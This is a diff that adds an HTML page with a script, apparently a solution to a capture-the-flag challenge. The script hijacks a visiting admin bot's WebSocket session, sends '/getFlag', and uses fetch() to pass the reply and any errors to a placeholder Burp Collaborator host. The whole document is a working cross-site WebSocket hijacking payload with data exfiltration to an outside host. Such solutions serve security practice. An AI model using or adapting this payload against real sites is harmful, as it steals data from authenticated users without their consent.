@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html><body>
+<script>
+  // 1) Open the real WS as “admin”
+  const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+
+  ws.onopen = () => {
+    // 2) Ask the bot for the flag
+    ws.send(JSON.stringify({ message: '/getFlag' }));
+  };
+
+  ws.onmessage = (evt) => {
+    // 3) Exfil it to your Burp Collaborator
+    //    Replace COLLAB_ID with your actual collaborator subdomain
+    fetch('https://COLLAB_ID.burpcollaborator.net/?data=' +
+          encodeURIComponent(evt.data))
+  };
+
+  ws.onerror = (e) => {
+    // optional: exfil any errors
+    fetch('https://COLLAB_ID.burpcollaborator.net/?error=' +
+          encodeURIComponent(e.message))
+  };
+</script>
+</body></html>
